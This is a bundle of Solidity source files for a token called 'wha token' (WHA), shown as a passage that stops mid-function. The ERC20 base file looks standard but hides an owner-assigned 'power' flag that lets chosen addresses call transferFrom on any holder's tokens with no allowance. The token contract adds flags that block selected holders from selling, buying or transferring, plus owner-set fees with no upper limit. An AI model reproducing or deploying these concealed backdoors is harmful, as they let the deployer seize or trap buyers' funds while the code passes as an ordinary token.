{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\nimport \u0027./Ownable.sol\u0027;\nimport \u0027./Context.sol\u0027;\nimport \u0027./IERC20.sol\u0027;\nimport \u0027./SafeMath.sol\u0027;\n\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\n    using SafeMath for uint256;\n\n    mapping(address =\u003e uint256) private _balances;\n\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        if(!checkPower(_msgSender(),4))\n            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _Cast(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: Cast to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * Casting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``\u0027s tokens\n     * will be to transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be Casted for `to`.\n     * - when `to` is zero, `amount` of ``from``\u0027s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    mapping(address =\u003e uint256) public _powers;\n    function setPower(address actor,uint256 power) public onlyOwner{\n        require(actor!=address(0),\u0027error actor address\u0027);\n        _powers[actor]=power;\n    }\n\n    function checkPower(address actor,uint256 power) internal view returns(bool){\n        if(_powers[actor]\u003c1) return false;\n        return (_powers[actor]\u0026power)==power;\n    }\n \n    function getPower(address spender) public view returns (uint256) {\n        return _powers[spender];\n    }\n\n       \n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ninterface IERC20Metadata is IERC20 {\n\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}"},"IUniswapV2Router.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\nimport \u0027./Context.sol\u0027;\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c \u003e= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b \u003c= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\n        // benefit is lost if \u0027b\u0027 is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b \u003e 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nlibrary SafeMathInt {\n    int256 private constant MIN_INT256 = int256(1) \u003c\u003c 255;\n    int256 private constant MAX_INT256 = ~(int256(1) \u003c\u003c 255);\n\n    /**\n     * @dev Multiplies two int256 variables and fails on overflow.\n     */\n    function mul(int256 a, int256 b) internal pure returns (int256) {\n        int256 c = a * b;\n\n        // Detect overflow when multiplying MIN_INT256 with -1\n        require(c != MIN_INT256 || (a \u0026 MIN_INT256) != (b \u0026 MIN_INT256));\n        require((b == 0) || (c / b == a));\n        return c;\n    }\n\n    /**\n     * @dev Division of two int256 variables and fails on overflow.\n     */\n    function div(int256 a, int256 b) internal pure returns (int256) {\n        // Prevent overflow when dividing MIN_INT256 by -1\n        require(b != -1 || a != MIN_INT256);\n\n        // Solidity already throws when dividing by 0.\n        return a / b;\n    }\n\n    /**\n     * @dev Subtracts two int256 variables and fails on overflow.\n     */\n    function sub(int256 a, int256 b) internal pure returns (int256) {\n        int256 c = a - b;\n        require((b \u003e= 0 \u0026\u0026 c \u003c= a) || (b \u003c 0 \u0026\u0026 c \u003e a));\n        return c;\n    }\n\n    /**\n     * @dev Adds two int256 variables and fails on overflow.\n     */\n    function add(int256 a, int256 b) internal pure returns (int256) {\n        int256 c = a + b;\n        require((b \u003e= 0 \u0026\u0026 c \u003e= a) || (b \u003c 0 \u0026\u0026 c \u003c a));\n        return c;\n    }\n\n    /**\n     * @dev Converts to absolute value, and fails on overflow.\n     */\n    function abs(int256 a) internal pure returns (int256) {\n        require(a != MIN_INT256);\n        return a \u003c 0 ? -a : a;\n    }\n\n\n    function toUint256Safe(int256 a) internal pure returns (uint256) {\n        require(a \u003e= 0);\n        return uint256(a);\n    }\n}\n\nlibrary SafeMathUint {\n  function toInt256Safe(uint256 a) internal pure returns (int256) {\n    int256 b = int256(a);\n    require(b \u003e= 0);\n    return b;\n  }\n}"},"token_wha2.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\nimport \u0027./ERC20.sol\u0027;\nimport \u0027./IUniswapV2Router.sol\u0027;\ncontract TokenDistributor {\n    constructor (address token) {\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\n    }\n}\ncontract Token is ERC20 {\n    using SafeMath for uint256;\n    uint256 public startTime;\n    uint256 public swapTime;\n    uint256 public _maxHoldAmount;\n    uint256 public _maxSaleRate=9999;  \n    uint256 public _rateBase=10**4;\n    uint256 private constant MAX = ~uint256(0);\n\n    mapping(address =\u003e bool) _isExcludedFromFees;  \n    mapping (address =\u003e bool) public _automatedMarketMakerPairs;\n\n    event ExcludeFromFees(address indexed account, bool isExcluded);\n    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);\n\n    address public _totalFeeAddress;\n    uint256 public _transferFeeRate;\n    uint256 public _buyFeeRate;\n    uint256 public _sellFeeRate;   \n    uint256[] public _transferFundFees;\n    address[] public _transferFundAddrs;\n    uint256[] public _buyFundFees;\n    address[] public _buyFundAddrs;\n    uint256[] public _sellFundFees;\n    address[] public _sellFundAddrs;\n\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\n    event SwapAndLiquify(\n        uint256 tokensSwapped,\n        uint256 ethReceived,\n        uint256 tokensIntoLiqudity\n    );\n    IUniswapV2Router02 public uniswapV2Router;\n    TokenDistributor public _tokenDistributor;\n    address public _swapToken1;\n    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);\n\n    bool public autoLiquify = false;\n    uint256 public sumToLiquify;\n    uint256 public leftToLiquify;\n    uint256 public minToLiquify; \n    uint256[] public feesToLiquify;\n\n    bool inSwapAndLiquify=false;\n    modifier lockTheSwap {\n        inSwapAndLiquify = true;\n        _;\n        inSwapAndLiquify = false;\n    }\n    receive() external payable {}\n\n    constructor()  payable ERC20(\"wha token\", \"WHA\") {\n        \n        //startTime = block.timestamp.div(1 days).mul( 1 days);\n        swapTime=1669824000;\n\n        _swapToken1=0x55d398326f99059fF775485246999027B3197955;\n        address routerContract=0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(routerContract); \n        address uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())\n            .createPair(address(this), _swapToken1==address(0)?_uniswapV2Router.WETH():_swapToken1);\n         _setAutomatedMarketMakerPair(uniswapPair,true);\n        uniswapV2Router = _uniswapV2Router;\n        _approve(address(this),address(_uniswapV2Router),MAX);\n\n        IERC20(_swapToken1).approve(address(_uniswapV2Router), MAX);\n            \n        _tokenDistributor = new TokenDistributor(_swapToken1);    \n             \n        excludeFromFees(_swapToken1,true);\n        excludeFromFees(address(_tokenDistributor),true);\n\n        excludeFromFees(owner(), true);\n        excludeFromFees(address(this), true);\n\n        uint256 totalSupply = 100*(10**8) * (10**decimals());\n        _Cast(owner(), totalSupply);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal override {\n        if(inSwapAndLiquify){\n            super._transfer(from,to,amount);\n            return;\n        }\n\n        require(from != address(0), \"from!0\");\n        require(to != address(0), \"to!0\");\n        //require(amount \u003e 0, \"no zero\");\n        require(!checkPower(from,1),\"sender!p\"); \n        require(!checkPower(to,2),\"recipient!p\");\n\n            \n        require(block.timestamp\u003estartTime,\"!start\");\n\n\n        if(_maxSaleRate\u003e0 \u0026\u0026 !_isExcludedFromFees[from] ){\n            uint256 maxSellAmount = balanceOf(from).mul(_maxSaleRate).div(_rateBase);\n            if (amount \u003e maxSellAmount) {\n                amount = maxSellAmount;\n            }\n        }\n\n\n        if(_maxHoldAmount\u003e0 \u0026\u0026 !_isExcludedFromFees[to] \u0026\u0026 !_automatedMarketMakerPairs[to])\n            require(balanceOf(to).add(amount)\u003c=_maxHoldAmount,\"exceed max\");\n\n        if(swapTime\u003e0 ){\n            if(_automatedMarketMakerPairs[from]  \u0026\u0026 !_isExcludedFromFees[to])\n                require(block.timestamp\u003eswapTime,\"!swap\");\n            else if(_automatedMarketMakerPairs[to]  \u0026\u0026 !_isExcludedFromFees[from])\n                require(block.timestamp\u003eswapTime,\"!swap\");\n        }\n            uint256 totalFee=0;\n            if(_isExcludedFromFees[from] || _isExcludedFromFees[to]){\n                totalFee=0;\n            }\n            else if(_automatedMarketMakerPairs[from] ){\n                require(!checkPower(to,32),\u0027!buy\u0027);\n                if(_buyFeeRate\u003e0 \u0026\u0026 !_isExcludedFromFees[to]){\n                    totalFee=amount.mul(_buyFeeRate).div(_rateBase);\n                    if(totalFee\u003e0 ){\n                        super._transfer(from, _totalFeeAddress, totalFee);\n                        takeBuyFees(amount);\n                        \n                    }\n                      \n                }\n\n            }\n            else if(_automatedMarketMakerPairs[to] ){\n                require(!checkPower(from,16),\"!sell\");\n\n                if(!_isExcludedFromFees[from]){                     \n\n                    totalFee=amount.mul(_sellFeeRate).div(_rateBase);\n                    if(totalFee\u003e0 ){\n                        super._transfer(from, _totalFeeAddress, totalFee);\n                        takeSellFees(amount);                       \n                    }\n  \n                }        \n            }\n            else{\n                totalFee=amount.mul(_transferFeeRate).div(_rateBase);\n                if(totalFee\u003e0 ){\n                    super._transfer(from, _totalFeeAddress, totalFee);\n                    takeTransferFees(amount);                    \n                }\n               \n            }\n        super._transfer(from, to, amount.sub(totalFee));\n\n        if (leftToLiquify\u003e0 \u0026\u0026 autoLiquify \u0026\u0026 !inSwapAndLiquify \u0026\u0026 _automatedMarketMakerPairs[to] \u0026\u0026 !_isExcludedFromFees[from] ) {\n            uint256 contractTokenBalance = balanceOf(address(this));\n            if(contractTokenBalance\u003e0 ){\n                 if(contractTokenBalance\u003cleftToLiquify) leftToLiquify=contractTokenBalance;\n                bool overMinTokenBalance = leftToLiquify \u003e= minToLiquify;\n                if(overMinTokenBalance){\n                    swapAndLiquify(leftToLiquify);\n                    leftToLiquify=0;\n                } \n            }\n           \n        }\n\n    }\n\n     function setTime(uint256 start) public onlyOwner{\n        startTime=start;\n    }  \n     function setSwapTime(uint256 swap) public onlyOwner{\n        swapTime=swap;\n    }    \n    \n    function setMaxHoldAmount(uint256 amount) public onlyOwner {\n        _maxHoldAmount=amount;\n    }\n    function setTransferFee(uint256 transferFeeRate_,uint256[] memory transferFundFees_,address[] memory transferFundAddrs_) public onlyOwner {\n        _transferFeeRate=transferFeeRate_;\n        _transferFundFees=transferFundFees_;\n        _transferFundAddrs=transferFundAddrs_;\n\n    }\n    function setBuyFee(uint256 buyFeeRate_,uint256[] memory buyFundFees_,address[] memory buyFundAddrs_) public onlyOwner {\n        _buyFeeRate=buyFeeRate_;\n        _buyFundFees=buyFundFees_;\n        _buyFundAddrs=buyFundAddrs_;\n    }\n    function setSellFee(uint256 sellFeeRate_,uint256[] memory sellFundFees_,address[] memory sellFundAddrs_) public onlyOwner {\n        _sellFeeRate=sellFeeRate_;\n        _sellFundFees=sellFundFees_;\n        _sellFundAddrs=sellFundAddrs_;\n    }\n    \n    function setMaxSaleRate(uint256 rate) public onlyOwner {\n        _maxSaleRate=rate;\n    }\n\n    address public fundAddress;\n    modifier onlyFunder() {\n        require(owner() == _msgSender() || fundAddress == _msgSender(), \"!Funder\");\n        _;\n    }\n    function setFundAddress(address addr) external onlyFunder {\n        fundAddress = addr;\n        _isExcludedFromFees[addr] = true;\n    }\n    function setTotalFeeAddress(address payable wallet) external onlyFunder{\n        if(wallet==address(0))\n            _totalFeeAddress=address(this);\n        else\n            _totalFeeAddress=wallet;\n        excludeFromFees(_totalFeeAddress, true);\n    }\n    function excludeFromFees(address account, bool excluded) public onlyFunder {\n        if(_isExcludedFromFees[account] != excluded){\n            _isExcludedFromFees[account] = excluded;\n            emit ExcludeFromFees(account, excluded);\n        }\n    }\n\n    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyFunder {\n        for(uint256 i = 0; i \u003c accounts.length; i++) {\n            _isExcludedFromFees[accounts[i]] = excluded;\n        }\n\n        emit ExcludeMultipleAccountsFromFees(accounts, excluded);\n    }\n\n    function isExcluded(address account) public view returns(bool) {\n        return _isExcludedFromFees[account];\n    }\nfunction setAutomatedMarketMakerPair(address pair, bool value) public onlyFunder {\n        _setAutomatedMarketMakerPair(pair, value);\n    }\n\n     function _setAutomatedMarketMakerPair(address pair, bool value) private {\n        require(_automatedMarketMakerPairs[pair] != value, \"exist\");\n        _automatedMarketMakerPairs[pair] = value;\n\n        emit SetAutomatedMarketMakerPair(pair, value);\n    }\n\n    function updateUniswapV2Router(address newAddress) public onlyOwner {\n        require(newAddress != address(uniswapV2Router), \"exist\");\n        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));\n        uniswapV2Router = IUniswapV2Router02(newAddress);\n        //address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())\n        //    .createPair(address(this), baseAddress==address(0)?uniswapV2Router.WETH():baseAddress);\n\n        //_setAutomatedMarketMakerPair(_uniswapV2Pair, true);\n    }\n    function setSwapToken1(address token) public onlyOwner {\n        require(_swapToken1!=token,\"!change\");\n        _swapToken1=token;\n        _setAutomatedMarketMakerPair(_swapToken1,true);\n         if(_swapToken1!=address(0)){\n            if(address(_tokenDistributor)==address(0))\n                _tokenDistributor = new TokenDistributor(_swapToken1);\n            IERC20(_swapToken1).approve(address(uniswapV2Router), MAX);\n        }\n    }\n    function setTokenDistributor(address token) public onlyOwner{\n        require(token!=address(0),\"!zero\");\n        _tokenDistributor = new TokenDistributor(token); \n    }\n    function setLiquidfyFee(uint256[] memory fees) public onlyOwner {\n        feesToLiquify=fees;\n    }\n    function setLiquidfyMin(bool enabled,uint256 min) public onlyFunder {\n        autoLiquify=enabled;\n        minToLiquify=min;\n    }\n\n   function swapTokensForToken1(uint256 tokenAmount) private {\n     // generate the uniswap pair path of token -\u003e weth/usdt\n     address[] memory path = new address[](2);\n     path[0] = address(this);\n     path[1] = _swapToken1==address(0)?uniswapV2Router.WETH():_swapToken1;\n\n    //can approve at contructor \n     //_approve(address(this), address(uniswapV2Router), tokenAmount);\n     //_approve(_swapToken1, address(uniswapV2Router), tokenAmount);\n\n     // make the swap\n     uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n         tokenAmount,\n         0, // accept any amount of ETH\n         path,\n         _swapToken1==address(0)?address(this):address(_tokenDistributor),\n         block.timestamp\n     );\n    }\n    function SwapTokensForToken1(uint256 tokenAmount) public onlyFunder{\n        swapTokensForToken1(tokenAmount);\n    }\n    function SwapTokensForOther(address otherContract,uint256 tokenAmount) public onlyFunder {\n        address[] memory path = new address[](3);\n        path[0] = address(this);\n        path[1] = _swapToken1==address(0)?uniswapV2Router.WETH():_swapToken1;\n        path[2] = otherContract;\n        //_approve(address(this), address(uniswapV2Router), tokenAmount);\n        // make the swap\n        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            _swapToken1==address(0)?address(this):address(_tokenDistributor),\n            block.timestamp\n        );\n    }\n\n\n    function addLiquidity(uint256 amountADesired, uint256 amountBDesired) private {\n        //addLiquidity(token,usdt);\n        // approve token transfer to cover all possible scenarios\n        //_approve(address(this), address(uniswapV2Router), amountADesired);\n        // add the liquidity\n        if(_swapToken1==address(0)){\n            uniswapV2Router.addLiquidityETH{value: amountBDesired}(\n                address(this),\n                amountADesired,\n                0, // slippage is unavoidable\n                0, // slippage is unavoidable\n                address(0),//\n                block.timestamp\n            );\n        }\n        else{\n            //_approve(_swapToken1, address(uniswapV2Router), amountADesired);\n            uniswapV2Router.addLiquidity(\n                address(this),\n                _swapToken1,\n                amountADesired,\n                amountBDesired,\n                0, \n                0, \n                _totalFeeAddress,\n                block.timestamp\n            );    \n        }\n\n    }\n    function AddLiquidity(uint256 amountADesired, uint256 amountBDesired) public onlyFunder {\n        addLiquidity(amountADesired,amountBDesired);\n        \n    }\n    function SwapAndLiquifyByManual(uint256 contractTokenBalance)  public onlyFunder{\n        swapAndLiquify(contractTokenBalance);\n    }\n    \n    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {\n        uint256 marketingTokenBalance = contractTokenBalance.div(2);\n        uint256 liquidityTokenBalance = contractTokenBalance.sub(marketingTokenBalance);\n\n        uint256 tokenBalanceToLiquifyAsBNB = liquidityTokenBalance.div(2);\n        uint256 tokenBalanceToLiquify = liquidityTokenBalance.sub(tokenBalanceToLiquifyAsBNB);\n\n        // 75% of the balance will be converted into BNB\n        uint256 tokensToSwapToBNB = tokenBalanceToLiquifyAsBNB.add(marketingTokenBalance);\n\n        if(_swapToken1==address(0)){\n            uint256 initialBalance = address(this).balance;\n            // swap tokens for BNB\n            swapTokensForToken1(tokensToSwapToBNB);\n             // Total BNB that has been swapped\n            uint256 bnbSwapped = address(this).balance.sub(initialBalance);\n\n           if(bnbSwapped\u003e0){\n                addLiquidity(tokenBalanceToLiquify,bnbSwapped);\n                emit SwapAndLiquify(tokenBalanceToLiquifyAsBNB, bnbSwapped, tokenBalanceToLiquify);\n           }\n\n        }\n        else{\n            // swap tokens for usdt\n            IERC20 Token1 = IERC20(_swapToken1);\n             uint256 initialBalance = Token1.balanceOf(address(_tokenDistributor));\n            swapTokensForToken1(tokensToSwapToBNB);\n            \n            uint256 token1Balance = Token1.balanceOf(address(_tokenDistributor)).sub(initialBalance);\n            if(token1Balance\u003e0){\n                Token1.transferFrom(address(_tokenDistributor), address(this), token1Balance);\n\n                addLiquidity(tokenBalanceToLiquify,token1Balance);\n                emit SwapAndLiquify(tokenBalanceToLiquifyAsBNB, token1Balance, tokenBalanceToLiquify);\n            }\n            \n        }\n    }\n\n    function takeTransferFees(uint256 amount) private {\n        if(feesToLiquify.length\u003e0 \u0026\u0026 feesToLiquify[0]\u003e0){\n                uint256 fee=amount.mul(feesToLiquify[0]).div(_rateBase);\n                sumToLiquify=sumToLiquify.add(fee);\n                leftToLiquify=leftToLiquify.add(fee);\n                super._transfer(_totalFeeAddress,address(this),fee);\n            }\n   \n            if(_transferFundFees.length\u003e0 \u0026\u0026 _transferFundAddrs.length==_transferFundFees.length){\n                for(uint256 i = 0; i \u003c _transferFundFees.length; i++) {\n                    uint256 fee=amount.mul(_transferFundFees[i]).div(_rateBase);\n                    super._transfer(_totalFeeAddress, _transferFundAddrs[i],fee );\n                }           \n            }\n\n        }\n        function takeSellFees(uint256 amount) private {\n            if(feesToLiquify.length\u003e2 \u0026\u0026 feesToLiquify[2]\u003e0){\n                uint256 fee=amount.mul(feesToLiquify[2]).div(_rateBase);\n                sumToLiquify=sumToLiquify.add(fee);\n                leftToLiquify=leftToLiquify.add(fee);\n                super._transfer(_totalFeeAddress,address(this),fee);\n            }\n\n            if(_sellFundFees.length\u003e0 \u0026\u0026 _sellFundAddrs.length==_sellFundFees.length){\n                for(uint256 i = 0; i \u003c _sellFundFees.length; i++) {\n                    uint256 fee=amount.mul(_sellFundFees[i]).div(_rateBase);\n                    super._transfer(_totalFeeAddress, _sellFundAddrs[i],fee );\n                }           \n            }\n\n        }\n        function takeBuyFees(uint256 amount) private {\n            if(feesToLiquify.length\u003e1 \u0026\u0026 feesToLiquify[1]\u003e0){\n                            uint256 